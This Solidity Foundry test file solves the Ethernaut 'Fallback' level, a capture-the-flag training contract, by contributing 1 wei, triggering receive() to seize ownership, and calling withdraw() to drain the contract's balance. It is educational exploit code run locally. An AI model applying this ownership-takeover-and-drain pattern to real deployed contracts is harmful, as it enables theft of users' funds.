// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/levels/01-FallbackFactory.sol";
import "../src/core/Ethernaut.sol";

contract FallbackTest is Test {
    Ethernaut ethernaut;
    address attacker = address(1337);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(attacker, 2 wei);
    }

    function testFallbackHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        FallbackFactory fallbackFactory = new FallbackFactory();
        ethernaut.registerLevel(fallbackFactory);
        vm.startPrank(attacker);
        address levelAddress = ethernaut.createLevelInstance(fallbackFactory);
        Fallback fallbackContract = Fallback(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        // 1. contribute in order to pass require checks
        // 2. trigger receive() to change ownership
        // 3. withdraw() to drain the contract
        fallbackContract.contribute{value: 1 wei}();
        assertEq(fallbackContract.getContribution(), 1 wei);

        (bool success, ) = payable(address(fallbackContract)).call{
            value: 1 wei
        }("");
        assertTrue(success);
        assertEq(fallbackContract.owner(), attacker);

        uint256 contractBalance = address(fallbackContract).balance;
        fallbackContract.withdraw();
        assertEq(address(fallbackContract).balance, 0);
        assertEq(attacker.balance, contractBalance);

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool isLevelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(isLevelSuccessfullyPassed);
    }
}
